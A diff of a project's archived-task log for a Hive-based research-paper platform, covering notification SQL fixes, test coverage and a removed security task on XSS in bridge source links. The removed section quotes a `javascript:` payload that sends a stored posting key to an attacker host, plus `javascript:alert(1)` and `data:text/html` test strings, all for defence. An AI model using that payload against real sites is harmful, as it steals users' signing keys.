@@ -1,3 +1,21 @@
+## BACKEND-NOTIFICATIONS-CLAIM-VOUCH-ARMS-SIGNER-GATE (archived 2026-06-08) — arms 8/9 EXISTS existence proof closes self-asserted-paper_author forgery; claim-correlation residual split to follow-up
+
+Round-2 (commit 4edd2390) added an EXISTS proof against `hafsql.comments` + `validPevoPaperWhere(source:'native')` to arms 8 (`claim_approved`) / 9 (`claim_revoked`), binding the signer (`required_posting_auths ->> 0`) to the REAL native post author instead of the JSON-self-asserted `paper_author` — closing the stranger/fake-paper forgery (negative canaries pin both arms: a stranger self-naming as paper_author of a fake or non-owned paper is dropped). Arm-4 vouch comment re-anchored on the schema NAME (Vouch / Web of Trust). Verified by a 9-reviewer `/ce-code-review` (correctness/security/adversarial on Opus). Invariants: bridge/admin branches stay param-bound (no JSON trust); arm-9 claimer-self branch safe because `json ->> 'claimer'` is pinned to `$1`; boolean precedence correct (EXISTS-OR group fully parenthesized inside the action/claimer/block_num ANDs); NULL `paper_permlink` → EXISTS no-match. RESIDUAL split to `backend-notifications-claim-approve-revoke-correlation`: the proof binds signer→paper-author but NOT paper→`claimer`($1), so any accredited paper-owner can still fire a spurious approve/revoke notification at an arbitrary victim by naming their OWN real paper; the same self-referential pattern also lives in `authorshipClaimsCteBody`; arms 8/9 also lack DISTINCT ON dedup. P2 (notification/email nuisance, no state/credit impact).
+
+---
+
+## BACKEND-NOTIFICATIONS-EDIT-REVOTE-DEDUP (archived 2026-06-08) — per-arm DISTINCT ON dedup; clean re-review ✓
+
+Round-1 (commit 3007f498) wrapped all eight raw-operation-view arms in DISTINCT ON dedup (comment arms 1a/1b/5 earliest-wins `block_num ASC`; vote arms 2a/2b/2c latest-wins `block_num DESC` with `vote_weight != 0` hoisted to the OUTER select so vote-then-retract suppresses; citation arms 6a/6b earliest-wins on the (citing post, cited paper) 4-tuple), so edits/revotes no longer re-fire duplicate notifications. Round-2 (commit 95c85069) landed 5 text/canary hold items, verified clean by a 3-reviewer `/ce-code-review` (correctness confirmed the SQL is byte-identical / comment-only): dropped the `BACKEND-SELF-REVIEW-EXCLUSION` slug/round citation from arm 1b's comment (P1 acceptance violation) and re-anchored on behavior; extended the arm-sql-shape header inventory (entries 6-9) + mutation-kill paragraph; trimmed the arm-1a INNER-JOIN canary title to join-form-only; ADDED the citation `ORDER BY citing.block_num ASC` direction pin (count==2, catches a DESC flip that would resurrect per-edit citation re-fire); expanded arm-5's dedup docblock.
+
+---
+
+## BACKEND-NOTIFICATIONS-VOTE-ARM-TEST-COVERAGE (archived 2026-06-08) — target_type pinned against production SQL; clean re-review ✓
+
+P3 test-quality follow-up to the vote-arm content-filter task. Round-2 (commit f8d939a7, test-only) landed 2 hold items, verified clean by a 3-reviewer `/ce-code-review`: (1) target_type now pinned against PRODUCTION — the vote-arm source-shape test slices each arm by its tag boundary (`region()` helper) and asserts the projection literal inside each (`'paper'::text` for 2a/2b, `'review'::text` for 2c), so a production literal swap fails red (the old `toContain("'review'")` only proved 'review' appeared SOMEWHERE in the 3-arm span); the 2b synthetic canary dropped the condemned `MIN('paper'::text)` for the fixture-derived `MIN(bp.target_type)`. (2) the arm-2b slice asserts INNER JOIN form (JOIN present, LEFT absent) + the `user_bridge_papers` CTE `registered_by=$1` predicate, so an INNER→LEFT flip or dropped predicate in production fails. All 6 `region()` markers verified unique + correctly ordered.
+
+---
+
 ## UI-NOTIFICATIONS-BLOCK-CURSOR-BOUNDARY-REWIND (archived 2026-06-08) — poll() rewinds cursor to latest_block-1 on has_more, clean review ✓
 
 `frontend/src/notifications.js` poll loop now sets the next cursor to `latest_block - 1` when the route reports `has_more === true` (the server's LIMIT cut the batch after the in-app since_block filter), so the boundary block is re-fetched instead of silently dropped; `has_more === false` advances to `latest_block` as before. The existing SPA dedup key (`block_num`/`type`/`actor`/`permlink`) collapses the re-rendered overlap. Landed at commit 032581a1 with three unit tests (rewind / advance / two-poll re-fetch+dedup). Unblocked by the backend `applySinceBlockFilter` rework (route-layer `has_more` recomputed as `filtered.length > events.length || batch.has_more`, no longer forced false when the in-app cursor filter drops events).
@@ -161,83 +179,3 @@ Re-review `/ce-code-review` (correctness on Opus; testing/maintainability/projec
 ## BACKEND-NOTIFICATIONS-VOTE-ARM-CONTENT-FILTER (archived 2026-05-30) — round-1 clean ✓ (code) + contract synced
 
 Notification vote arm 2 only required `v.author = $1` + accredited voter, so a vote on the recipient's non-PEvO Hive content surfaced as "X endorsed your paper" and votes on reviews wrongly emitted `target_type='paper'`. Split into 2a (native paper votes: `JOIN comments` + `validPevoPaperWhere`, `target_type='paper'`), 2b (bridge paper votes via `user_bridge_papers`, `'paper'`), 2c (review votes: `JOIN comments` + `validReviewWhere`, `target_type='review'`), each adding `v.voter != v.author` to drop self-votes. Added synthetic-VALUES canaries (2a content-filter+self-vote, 2c review `target_type`) + a source-shape guard. Architect landed the contract half: documented `new_vote.target_type` as `"paper" | "review"` plus the self-vote exclusion in `api-contracts/notifications.md`. Round-1 `/ce-code-review` (security+correctness on Opus; testing/maintainability/performance/project-standards on Sonnet): code clean. Verified content gates complete (the gated metadata belongs to the recipient `$1`, so no cross-account forgery), gates mutually exclusive on the single-valued `pevo.type` (no double-fire), 2b recipient-scoped via the `registered_by` CTE, UNION arity correct, JOINs bounded by the comments PK. F6 (no union-level mutual-exclusion canary) dismissed — safe by construction.
-
-## UI Bridge Source-Href Protocol Validation (archived 2026-05-30)
-
-# UI-BRIDGE-SOURCE-HREF-PROTOCOL-VALIDATION — block `javascript:` / `data:` protocols in bridge external paper-source links
-
-**Owner:** UI Agent
-**Created:** 2026-05-30 (security audit follow-up workflow)
-**Priority:** P2 (one-click XSS via attacker-crafted bridge entry; severity depends on who can author bridge json_metadata fields)
-
-## Problem
-
-The bridge feature renders external paper-source URLs from chain `json_metadata` via Alpine `:href` bindings without a protocol whitelist:
-
-- `frontend/src/pages/paper-detail.js` — the bridge-paper source-URL `<a :href="...">` render (post-import or post-bridge view).
-- `frontend/src/pages/bridge.js` — the bridge lookup preview, rendering source and PDF URLs.
-
-Alpine's attribute binding safely escapes quote-breakout but does NOT block `javascript:`, `data:text/html`, or similar protocol-injection URLs. The markdown sanitizer's URL-protocol transformer (the chokepoint in `frontend/src/components/markdown-renderer.js`) is bypassed entirely here — these bindings read raw values from chain `json_metadata` and feed them to `:href` directly.
-
-Clicking an attacker-crafted bridge entry whose source URL is `javascript:fetch('//attacker?'+localStorage.posting_key)` executes script same-origin under `pevo.app`.
-
-Severity depends on who can author bridge `json_metadata` fields. If bridge entries can be authored by any Hive account (no accreditation gate), this is a higher-impact reflected XSS. If only accredited authors can populate the bridge fields, the surface is narrower but still a real one-click XSS sink. The fix is the same either way; this task does not depend on resolving that question.
-
-## Goal
-
-Wrap every bridge external URL render with a small `safeExternalUrl(url)` helper that returns the URL only if `new URL(url).protocol` is in `{'http:', 'https:'}`, else returns a safe fallback (`'#'` or `''`).
-
-## Fix sketch
-
-```js
-// frontend/src/utils/safe-url.js (or co-located in a frontend utils module)
-export function safeExternalUrl(url) {
-  if (typeof url !== 'string' || !url) return '';
-  try {
-    const parsed = new URL(url, window.location.origin);
-    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
-      return parsed.href;
-    }
-  } catch {
-    // fall through
-  }
-  return '';
-}
-```
-
-Then in the two consuming files:
-
-```js
-// before
-<a :href="sf.source_url" target="_blank">...</a>
-// after
-<a :href="safeExternalUrl(sf.source_url)" target="_blank" rel="noopener noreferrer">...</a>
-```
-
-Apply to every `:href` binding in the bridge surface that reads from `json_metadata` or chain-derived data. While touching these sites, also confirm `rel="noopener noreferrer"` is present (existing convention; flag in-place if missing).
-
-Co-location decision (utils module vs inline): implementer's call; a shared util is preferred since this is reusable for any future external-URL render.
-
-## Acceptance
-
-1. **`javascript:` rejected.** Test: a bridge entry whose source URL is `javascript:alert(1)` renders with `href=""` (or whatever the safe fallback is). Click does NOT execute script.
-2. **`data:text/html` rejected.** Same as (1) for `data:text/html,<script>alert(1)</script>`.
-3. **`http:` and `https:` permitted.** Test: legitimate `https://arxiv.org/abs/...` URLs render unchanged and navigate normally.
-4. **Both consumer files updated.** Grep confirms every `:href` binding in `frontend/src/pages/paper-detail.js` and `frontend/src/pages/bridge.js` that reads bridge / chain-derived data flows through `safeExternalUrl`.
-5. **`rel="noopener noreferrer"` present** on every `target="_blank"` external link in the bridge surface (in-place fix if missing).
-6. **Mutation-kill:** revert the protocol check → at least one of the rejection tests goes RED.
-
-## Out of scope
-
-- A site-wide audit of every `:href` / `:src` binding outside the bridge surface (the focused audit confirmed the rest of the surface is clean today; revisit if a new external-URL render lands).
-- Backend-side validation of bridge `json_metadata` shape (the chain is the source of truth; the frontend defends at render).
-- The question of who can author bridge entries (separate concern; the fix is needed regardless).
-
-## References
-
-- `frontend/src/pages/paper-detail.js` — bridge source-URL render.
-- `frontend/src/pages/bridge.js` — bridge lookup preview render.
-- `frontend/src/components/markdown-renderer.js` — the chokepoint that DOES block `javascript:` (reference for the protocol check pattern, plus the URL transformer used by DOMPurify).
-- MDN: `URL` constructor and `protocol` property semantics.
-
-Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
